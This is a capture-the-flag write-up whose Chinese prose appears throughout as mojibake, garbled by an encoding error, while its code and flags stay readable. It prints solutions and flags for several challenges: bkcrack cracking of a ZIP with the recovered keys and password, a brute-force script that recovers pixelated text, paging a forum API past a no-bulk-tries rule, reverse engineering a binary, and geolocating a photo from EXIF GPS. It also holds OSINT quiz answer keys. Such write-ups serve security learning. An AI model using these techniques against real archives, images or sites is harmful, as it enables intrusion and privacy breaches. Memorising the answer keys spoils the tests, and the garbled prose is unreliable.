<code>20</code>ï¼Œä½†æˆ‘ç”Ÿæˆäº†ä¸€ä¸ªæ–‡ä»¶ç¬¬ 3 ä½æ˜¯ <code>1C</code>ã€‚ã€‚ã€‚<br>ç¬¬ 4-9 ä½æ˜¯ <code>667479706070</code> å°±æ˜¯æç¤ºçš„ï¼Œä½†ç°åœ¨åªæœ‰ 10 ä½ï¼Œè¿˜éœ€è¦ä¸¤ä½ã€‚å¯ä»¥éšæœºæŠ“åé¢çš„ç©ºç™½éƒ¨åˆ†æ¥è¡¥å……ä½æ•°ï¼Œä¹‹åå°±å¯èƒ½å¯ä»¥æ­£å¸¸çˆ†ç ´å¯†é’¥äº†ï¼ˆæ²¡çˆ†å‡ºæ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â¯ python crypto.py</span><br><span class="line">level:5</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[22:16:14] Z reduction using 1048569 bytes of known plaintext</span><br><span class="line">0.8 % (8070 / 1048569)</span><br><span class="line">[22:16:15] Attack on 130 Z values at index 1041024</span><br><span class="line">Keys: a08fc77f 1dd36012 734e2126</span><br><span class="line">76.2 % (99 / 130)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 99</span><br><span class="line">[22:16:15] Keys</span><br><span class="line">a08fc77f 1dd36012 734e2126</span><br></pre></td></tr></table></figure><p>å‹ç¼©åŒ…å¯†ç æ˜¯ï¼š<code>D0mbgaf6OhNp</code> è§£å¯†å³å¯</p><blockquote><p>uncrackable.m4a æ˜¯å‘¨æ·±çš„ Unstoppable ï¼ˆæŒºé…çš„</p></blockquote><h2 id="éå¸¸å¥½å¿½æ‚ æ··åˆ"><a href="#éå¸¸å¥½å¿½æ‚ æ··åˆ" class="headerlink" title="éå¸¸å¥½å¿½æ‚ æ··åˆ"></a>éå¸¸å¥½å¿½æ‚ æ··åˆ</h2><p>flag1 æ‰¾ä¸ªå“”ç«™è§†é¢‘ä¸‹è½½çš„è§£æä¸‹åŸå§‹æ ‡é¢˜å¾—åˆ°ï¼ˆåœ¨å»å¹´çš„æ—¶å€™å°±çŸ¥é“äº†<br>flag2 åœ¨è§†é¢‘çš„ç¬¬äºŒå¸§å‡ºç°ï¼ˆä¸€çœ¼</p><p><code>flag&#123;h0W_d0_y0U_kN0w_mY_V1d3O_n4M3&#125;</code><br><code>flag&#123;f1Nd_7H3_f14g_iN_Th3_S3c0nD_fr4m3&#125;</code></p><h2 id="å¿ƒä¸­æ— ç ï¼Œè‡ªç„¶é«˜æ¸…"><a href="#å¿ƒä¸­æ— ç ï¼Œè‡ªç„¶é«˜æ¸…" class="headerlink" title="å¿ƒä¸­æ— ç ï¼Œè‡ªç„¶é«˜æ¸…"></a>å¿ƒä¸­æ— ç ï¼Œè‡ªç„¶é«˜æ¸…</h2><p>è¿™é¢˜æ˜¯è¿è’™å¸¦çŒœçš„ï¼ŒåŸºæœ¬æ€è·¯å°±æ˜¯éå†å­—ç¬¦ç”Ÿæˆé©¬èµ›å…‹ï¼Œçœ‹å’Œå¯†æ–‡æ˜¯å¦ä¸€è‡´ï¼ˆæˆ–è¯¯å·®å¾ˆå°ï¼‰<br>åˆ°ä¸‹åˆ’çº¿è¦æ›´æ”¹ 44&#x2F;45 è¡Œï¼Œä¸º <code>ll = len(flag) - 1</code> è°ƒæ•´æšä¸¾ä¸­é—´ä½ç½®ï¼Œå¦‚æœä¸ºç©ºå¯ä»¥è·³è¿‡ï¼Œè¿™æ ·èƒ½å¾—åˆ° <code>flag&#123;lag&#123;ev3R tH1</code> å¦‚æœæ²¡æœ‰ç»“æœå¯ä»¥æŠŠ 50 è¡Œå–æ¶ˆæ³¨é‡Šï¼Œè¾“å‡ºå·®åˆ«è¾ƒå°çš„å­—æ¯ï¼Œå†çŒœä¸‹èƒ½è¿˜åŸ flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont, ImageChops</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line">flag = <span class="string">r&#x27;flag&#123;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> k &lt; <span class="number">255</span>:</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">    H = <span class="number">68</span></span><br><span class="line">    W = <span class="number">34</span></span><br><span class="line"></span><br><span class="line">    canvas = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (W * <span class="built_in">len</span>(flag), H), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    font = ImageFont.truetype(</span><br><span class="line">        <span class="string">&#x27;./JetBrainsMono-Regular.ttf&#x27;</span>, <span class="number">56</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    pen = ImageDraw.Draw(canvas)</span><br><span class="line">    pen.text((<span class="number">0</span>, <span class="number">0</span>), flag, <span class="string">&#x27;black&#x27;</span>, font)</span><br><span class="line"></span><br><span class="line">    canvas.save(<span class="string">&#x27;flag_uncensored.png&#x27;</span>, <span class="built_in">format</span>=<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        char = canvas.crop((W * i, <span class="number">0</span>, W * (i + <span class="number">1</span>), H))</span><br><span class="line">        char.save(<span class="string">f&#x27;./tmp_char/char_<span class="subst">&#123;i&#125;</span>.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mosaic_img</span>(<span class="params">img: Image.Image, L, H, R, D</span>):</span><br><span class="line">        w, h = R - L, D - H</span><br><span class="line">        a = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">                j = img.getpixel((L + x, H + y))</span><br><span class="line">                <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">                    a[ch] += j[ch]</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">        b = [k // cnt <span class="keyword">for</span> k <span class="keyword">in</span> a]</span><br><span class="line">        mosaic = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (w, h), <span class="built_in">tuple</span>(b))</span><br><span class="line">        img.paste(mosaic, (L, H, R, D))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="built_in">len</span>(flag)):</span><br><span class="line">        mosaic_img(canvas, W * i, <span class="number">0</span>, W * i + W, H // <span class="number">2</span>)</span><br><span class="line">        mosaic_img(canvas, W * i, H // <span class="number">2</span>, W * i + W, H)</span><br><span class="line"></span><br><span class="line">    canvas.save(<span class="string">&#x27;flag_censored.png&#x27;</span>, <span class="built_in">format</span>=<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line">    f = Image.<span class="built_in">open</span>(<span class="string">&#x27;./70.png&#x27;</span>)</span><br><span class="line">    censored = Image.<span class="built_in">open</span>(<span class="string">&#x27;./flag_censored.png&#x27;</span>)</span><br><span class="line">    ll = <span class="built_in">len</span>(flag)</span><br><span class="line">    <span class="comment"># ll = len(flag) - 1</span></span><br><span class="line">    cropped_region = f.crop((W * (ll - <span class="number">1</span>), <span class="number">0</span>, W * ll, H // <span class="number">2</span>))</span><br><span class="line">    censored_cropped = censored.crop((W * (ll - <span class="number">1</span>), <span class="number">0</span>, W * ll, H // <span class="number">2</span>))</span><br><span class="line">    diff = ImageChops.difference(censored_cropped, cropped_region)</span><br><span class="line">    <span class="keyword">if</span> diff.getextrema()[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">1</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">2</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># print(&quot;not best&quot;, chr(k), diff.getextrema())</span></span><br><span class="line">        cropped_region = f.crop((W * (ll - <span class="number">1</span>), H // <span class="number">2</span>, W * ll, H))</span><br><span class="line">        censored_cropped = censored.crop((W * (ll - <span class="number">1</span>), H // <span class="number">2</span>, W * ll, H))</span><br><span class="line">        diff = ImageChops.difference(censored_cropped, cropped_region)</span><br><span class="line">        <span class="keyword">if</span> diff.getextrema()[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">1</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">2</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(k), diff.getextrema())</span><br><span class="line">    flag = flag[:-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p><code>flag&#123;ev3RytH1ng_1s_Cl3Ar&#125;</code></p><h2 id="èººå¹³é—®ç­”"><a href="#èººå¹³é—®ç­”" class="headerlink" title="èººå¹³é—®ç­”"></a>èººå¹³é—®ç­”</h2><blockquote><p>ä¸Šå‘¨ï¼Œèº«ä¸º2024å±Šè‹±æ‰è®¡åˆ’åŸ¹å…»å¯¹è±¡çš„å‡ºé¢˜äººZianTTå‚åŠ äº†ä¸€æ¬¡å†¬ä»¤è¥ï¼Œè¯·é—®ä»–çš„æ´»åŠ¨å¤§è‡´åœ°ç‚¹æ˜¯ï¼Ÿï¼ˆä¸ƒä¸ªæ±‰å­—ï¼‰</p></blockquote><p>ä¸ä¼šæœ‰äººä¸æ­¢åˆ° HIT å§ï¼ˆ</p><blockquote><p>åœ¨2023å¹´ï¼ŒCloudflareå› ä¸ºæœºæˆ¿åœç”µå¯¼è‡´å¤§é‡æœåŠ¡ä¸å¯ç”¨ï¼ŒCloudflareå®˜æ–¹åšå®¢è®°è½½æ­¤æ—¶çš„è‹±æ–‡ç‰ˆé“¾æ¥æ˜¯ï¼š</p></blockquote><p>å¦‚ä½•å¹²ç¿» CloudFlareï¼Ÿç»™å®ƒçš„æ•°æ®ä¸­å¿ƒæ‹‰é—¸ï¼ˆï¼Œåœ¨ cf çš„ blog å¯ä»¥æ‰¾åˆ° ï¼ˆæˆ–è€…ç›´æ¥æœ</p><blockquote><p>QQä¸Šçº¿äº†æ–°æ˜¥æ´»åŠ¨ï¼Œä½†ç³Ÿç³•çš„ä½“éªŒæ˜¾ç„¶å¼•å‘äº†ä¸€äº›ç”¨æˆ·çš„å›°æ‰°ï¼Œå…³é—­è¯¥åŠŸèƒ½çš„é“¾æ¥æ˜¯ï¼Ÿï¼ˆä¸€ä¸ªç”±https:&#x2F;&#x2F;å¼€å§‹çš„é“¾æ¥ï¼‰</p></blockquote><p>è¿™æ˜¯æœ€åæ‰å‡ºçš„é¢˜ï¼Œæœ¬æ¥ä»¥ä¸ºè¦å‰å‡ å¹´çš„å…³é—­å…¥å£ï¼Œç»“æœå¡«ä»Šå¹´çš„è¡¨å•å°±è¡Œï¼Œåœ¨ QA ç¾¤é‡Œå¯ä»¥æ‰¾åˆ°</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">æç¤º</span><br><span class="line">QQ æ˜¥èŠ‚æ´»åŠ¨å…³é—­ç™»è®°è¡¨</span><br><span class="line">https://docs.qq.com/form/page/DUWl2cXN2WktZVWlB</span><br><span class="line">è®¾ç½® - å…³äº QQ ä¸å¸®åŠ© - åé¦ˆ - ã€Œå¦‚ä½•å…³é—­æ˜¥èŠ‚çº¢åŒ…æ´»åŠ¨ã€</span><br><span class="line">2024-02-06</span><br><span class="line">15.6K viewsedited  </span><br><span class="line">12:29</span><br></pre></td></tr></table></figure><blockquote><p>HTCPCPæ˜¯ä¸€ç§ç±»ä¼¼HTTPçš„åè®®ï¼Œç”¨äºæ§åˆ¶å’–å•¡å£¶ï¼Œå…¶ä¸­ï¼Œå½“å‘é€äº†BREWè¯·æ±‚æ¥å†²æ³¡çš„æ—¶å€™ï¼Œå¦‚æœæœåŠ¡è®¤ä¸ºè¯·æ±‚çš„æ·»åŠ é¡¹ç»„åˆè¿èƒŒäº†é¥®é…’è€…å¯¹æ‰€è¿°ç§ç±»çš„å…±è¯†ï¼Œè¿”å›çš„çŠ¶æ€ç æ˜¯ï¼š</p></blockquote><p>æ‡’å¾—çœ‹å°±æŠŠæ–‡æ¡£çš„çŠ¶æ€ç éƒ½è¯•ä¸‹</p><blockquote><p>OpenAIåœ¨2024å¹´1æœˆå‘ç”Ÿäº†å¤šå°‘è¿è¡Œäº‹ä»¶(ä»¥å…¬ç¤ºæ•°æ®ä¸ºå‡† )ï¼š</p></blockquote><p>goto <a href="https://status.openai.com/history">https://status.openai.com/history</a> æ•°ä¸‹ä¸€æœˆä»½çš„æ•°æ®</p><blockquote><p>æ¯”èµ›å¹³å°åŸŸåtpcup.orgçš„Registry Domain ID æ˜¯ï¼š</p></blockquote><p>åœ¨ <a href="https://lookup.icann.org/en/lookup">https://lookup.icann.org/en/lookup</a> æŸ¥åˆ°</p><blockquote><p>æœ¬æ¬¡æ¯”èµ›è®¡ç®—æœåŠ¡æä¾›å•†æ‰€åœ¨ä¸»ä½“çº³ç¨äººè¯†åˆ«å·æ˜¯ï¼šï¼ˆ18ä½ç”±æ•°å­—å’Œå¤§å†™å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼‰</p></blockquote><p>èµåŠ©å•†æ˜¯æ™äº‘ï¼Œåœ¨å®˜ç½‘ç»™å‡ºäº†å…¬å¸åï¼Œæœç´¢ä¸€ä¸‹çº³ç¨äººè¯†åˆ«å·å°±è¡Œ</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_1&quot;</span><span class="punctuation">:</span><span class="string">&quot;å“ˆå°”æ»¨å·¥ä¸šå¤§å­¦&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_2&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://blog.cloudflare.com/post-mortem-on-cloudflare-control-plane-and-analytics-outage&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_3&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://docs.qq.com/form/page/DUWl2cXN2WktZVWlB&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_4&quot;</span><span class="punctuation">:</span><span class="string">&quot;403&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_5&quot;</span><span class="punctuation">:</span><span class="string">&quot;11&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_6&quot;</span><span class="punctuation">:</span><span class="string">&quot;6de68c6722e84ac0a541745e94b7dca0-LROR&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_7&quot;</span><span class="punctuation">:</span><span class="string">&quot;91440403MACK9P7J40&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><del>XXï¼Œä¸€é“éƒ½åšä¸å‡ºæ¥ï¼Œé‡å¼€å§</del><br><code>å…¨åšå‡ºæ¥äº†ï¼è¿™æ˜¯flag1flag&#123;I_L0v3_tP4sK&#125;è¿™æ˜¯flag2flag&#123;very_go0d_questOnS&#125;</code></p><blockquote><p>ä¸­è‹±æ–‡æ²¡ç©ºæ ¼å·®è¯„</p></blockquote><h2 id="èººå¹³è®ºå›"><a href="#èººå¹³è®ºå›" class="headerlink" title="èººå¹³è®ºå›"></a>èººå¹³è®ºå›</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>F12 Find flag1</p><p><code>flag&#123;we1cc0m3_t0_taN6P4ng_f0Rum&#125;</code></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>flag2 è¦æ‰¾åˆ°æœ‰ flag çš„ discussionï¼Œä½†è¯´ä¸èƒ½æ‰¹é‡å°è¯•ï¼ˆ<br>çœ‹äº†ä¸‹ flarum çš„æŸ¥è¯¢æ¥å£ï¼Œé»˜è®¤ä¸€æ¬¡ 20 æ¡æœ‰ç‚¹æ…¢ï¼Œæ€»å…± 1048 æ¡è¦è¯• 53 ã€‚ä½†çŒœæµ‹å®ƒæœ‰ limit å‚æ•°å¯ä»¥æ§åˆ¶æ•°é‡ï¼Œæµ‹è¯•å‘ç°ä¸€æ¬¡æœ€å¤š 50 æ¡ï¼Œåªè¦å‘ 21 æ¬¡å°±èƒ½æ‰¾åˆ°äº†<br>è¿æ¥ï¼š <a href="https://forum.tpcup.org/api/discussions?page%5Boffset%5D=450&page%5Blimit%5D=50">&#x2F;api&#x2F;discussions?page[offset]&#x3D;450&amp;page[limit]&#x3D;50</a></p><p>çœ‹åˆ° flag æ‰çŸ¥é“é¢„æœŸè§£æ˜¯çœ‹ sitemap<br>å¯ä»¥ä» <a href="https://forum.tpcup.org/sitemap.xml">&#x2F;sitemap.xml</a> åˆ° <a href="https://forum.tpcup.org/sitemap-live/1">&#x2F;sitemap-live&#x2F;1</a> åˆ° <a href="https://forum.tpcup.org/d/566-flag">&#x2F;d&#x2F;566-flag</a> æ‰¾åˆ° flag</p><p><code>flag&#123;1_C5n_F1n5_f14G_Fr0m_s1t3m4p&#125;</code></p><h2 id="HIT-å‡†å…¥è®¤è¯"><a href="#HIT-å‡†å…¥è®¤è¯" class="headerlink" title="HIT! å‡†å…¥è®¤è¯!"></a>HIT! å‡†å…¥è®¤è¯!</h2><h3 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h3><p>flag1 æŸ¥çœ‹å­—ç¬¦ä¸²</p><p><code>flag&#123;ZI4n7T_a7T3nd_ycjH_w1nt3r_c4mP_1n_h1t&#125;</code></p><h3 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h3><p>åˆ†æ sub_1165 å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1165</span><span class="params">(__int64 a1, <span class="type">char</span> a2, __int64 a3, __int64 a4, <span class="type">int</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)i &gt;= a5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)((<span class="type">int</span>)i + a4) = a2 * *(_BYTE *)((<span class="type">int</span>)i + a1) + *(_BYTE *)((<span class="type">int</span>)i + a3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠ a1 å­—ç¬¦æ¯ä¸€ä½ä¹˜ä»¥ 233 åŠ ä¸Š a3 æ•°ç»„å¯¹åº”ä½çš„å€¼æ¨¡ 256ã€‚sub_125E å‡½æ•°æ˜¯ base64 æ¢è¡¨ç¼–ç ã€‚</p><p>base64 ç è¡¨ï¼š<code>asdfghjklqwertyuiopzxcvbnmQWERTYUIOPZXCVBNMASDFGHJKL$%^)!@#&amp;*(-?</code></p><p>base64 å¯†æ–‡ï¼š<code>%%xv$v^DlcLAHnMaxNF^ndmEOVr^r^?v-AJoOJczCo$.</code></p><p>a3 æ•°ç»„å¯¹åº”çš„æ˜¯ unk_4060ï¼Œå¯ä»¥ç›´æ¥ä»è·Ÿè¸ªä¸­è·å–</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a3 = [<span class="number">0x1</span>, <span class="number">0x9</span>, <span class="number">0xcd</span>, <span class="number">0x12</span>, <span class="number">0x7a</span>, <span class="number">0x9e</span>, <span class="number">0x79</span>, <span class="number">0xf1</span>, <span class="number">0x74</span>, <span class="number">0x19</span>, <span class="number">0x19</span>, <span class="number">0xc</span>, <span class="number">0xdb</span>, <span class="number">0x6f</span>, <span class="number">0x25</span>, <span class="number">0x14</span>, <span class="number">0xdd</span>, <span class="number">0x61</span>, <span class="number">0x13</span>, <span class="number">0xe2</span>, <span class="number">0x8b</span>, <span class="number">0xbc</span>, <span class="number">0xc4</span>, <span class="number">0x26</span>, <span class="number">0x83</span>, <span class="number">0xbe</span>, <span class="number">0xb8</span>, <span class="number">0x70</span>, <span class="number">0xaa</span>, <span class="number">0x4a</span>, <span class="number">0x90</span>, <span class="number">0x58</span>]</span><br><span class="line">a1= [<span class="number">0xd7</span>, <span class="number">0x55</span>, <span class="number">0x16</span>, <span class="number">0xd1</span>, <span class="number">0x6d</span>, <span class="number">0xad</span>, <span class="number">0x21</span>, <span class="number">0x5c</span>, <span class="number">0xeb</span>, <span class="number">0xc1</span>, <span class="number">0x8a</span>, <span class="number">0x80</span>, <span class="number">0x52</span>, <span class="number">0x9b</span>, <span class="number">0xb6</span>, <span class="number">0x60</span>, <span class="number">0x26</span>, <span class="number">0x5c</span>, <span class="number">0x8a</span>, <span class="number">0x73</span>, <span class="number">0x36</span>, <span class="number">0x33</span>, <span class="number">0x6f</span>, <span class="number">0xd6</span>, <span class="number">0xfa</span>, <span class="number">0xbc</span>, <span class="number">0x51</span>, <span class="number">0x8b</span>, <span class="number">0x15</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x1d</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> (j * <span class="number">233</span> + a3[i]) % <span class="number">256</span> == a1[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;7h3_hIT_LilaC_is_s0_N1c3!!&#125;</code></p><h2 id="bepbep"><a href="#bepbep" class="headerlink" title="bepbep"></a>bepbep</h2><h3 id="flag1-2"><a href="#flag1-2" class="headerlink" title="flag1"></a>flag1</h3><p>morse2ascii ä½ å€¼å¾—æ‹¥æœ‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">â¯ morse2ascii morse.wav</span><br><span class="line"></span><br><span class="line">MORSE2ASCII 0.2.1</span><br><span class="line">by Luigi Auriemma</span><br><span class="line">e-mail: aluigi@autistici.org</span><br><span class="line">web:    aluigi.org</span><br><span class="line"></span><br><span class="line">- open morse.wav</span><br><span class="line">wave size      597040</span><br><span class="line">format tag     1</span><br><span class="line">channels:      1</span><br><span class="line">samples/sec:   8000</span><br><span class="line">avg/bytes/sec: 8000</span><br><span class="line">block align:   1</span><br><span class="line">bits:          8</span><br><span class="line">samples:       597040</span><br><span class="line">bias adjust:   0</span><br><span class="line">volume peaks:  -31744 31744</span><br><span class="line">normalize:     1023</span><br><span class="line"></span><br><span class="line">- decoded morse data:</span><br><span class="line">flag  g3t  f14g  fr0m  mor3ecad3  add  underline  between  each  word  go  to  https:://storage..wearos..fans//amarket//name..wav  (all  lowercase))</span><br></pre></td></tr></table></figure><p><code>flag&#123;g3t_f14g_fr0m_mor3ecad3&#125;</code></p><h3 id="flag2-2"><a href="#flag2-2" class="headerlink" title="flag2"></a>flag2</h3><p>flag2 æ˜¯ SSTVï¼Œç”¨ Qsstv æ¥æ”¶å›¾åƒ</p><p>flag{SSTV_IS_VERY_INTERESTING}</p><blockquote><p>HEN HAO DE JIE MI AI LAI ZI TANG PING BEI</p></blockquote><h2 id="æˆ‘æœï¼Œå¤§ç›’"><a href="#æˆ‘æœï¼Œå¤§ç›’" class="headerlink" title="æˆ‘æœï¼Œå¤§ç›’"></a>æˆ‘æœï¼Œå¤§ç›’</h2><h3 id="flag1-3"><a href="#flag1-3" class="headerlink" title="flag1"></a>flag1</h3><blockquote><p>é—®é¢˜1ï¼šå›¾ç‰‡ä¸­çš„ä½ç½®é™„è¿‘æœ‰ä¸€æ¡é«˜é€Ÿå…¬è·¯ è¯·ç»™å‡ºé«˜é€Ÿå…¬è·¯ç¼–å·[G+ä¸¤ä½æ•°å­—]</p></blockquote><p>ä¸‹è½½ç…§ç‰‡åˆ°æ‰‹æœºï¼Œæœ‰æä¾› GPS ä¿¡æ¯ï¼Œç›´æ¥å®šä½ã€‚</p><blockquote><p>é—®é¢˜2ï¼šå›¾ç‰‡æ‰€åœ¨ä½ç½®æœ€è¿‘çš„å¸‚æ˜¯å“ªä¸ª[XX(X)å¸‚]</p></blockquote><p>åŒä¸Šï¼Œåœ°å›¾å¯çœ‹</p><blockquote><p>é—®é¢˜3ï¼šå›¾ç‰‡é‡‡ç”¨çš„ISOæ„Ÿå…‰åº¦æ˜¯å¤šå°‘</p></blockquote><p>çœ‹ä¸‹ exif iso</p><h3 id="flag2-3"><a href="#flag2-3" class="headerlink" title="flag2"></a>flag2</h3><p>åœ¨ <a href="http://cnrail.geogv.org/zhcn/station/41060731">ä¸­å›½é“è·¯åœ°å›¾ cnrail.geogv.org</a> æ‰¾ä¸‹ æ¼³å¿ã€é™‡å—ã€å¹¿å…ƒè¿™å‡ ä¸ªç«™ï¼Œç»“åˆçŸ­ä¿¡æ—¶é—´å°è¯•</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans1&quot;</span><span class="punctuation">:</span><span class="string">&quot;G75&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans2&quot;</span><span class="punctuation">:</span><span class="string">&quot;é˜†ä¸­å¸‚&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans3&quot;</span><span class="punctuation">:</span><span 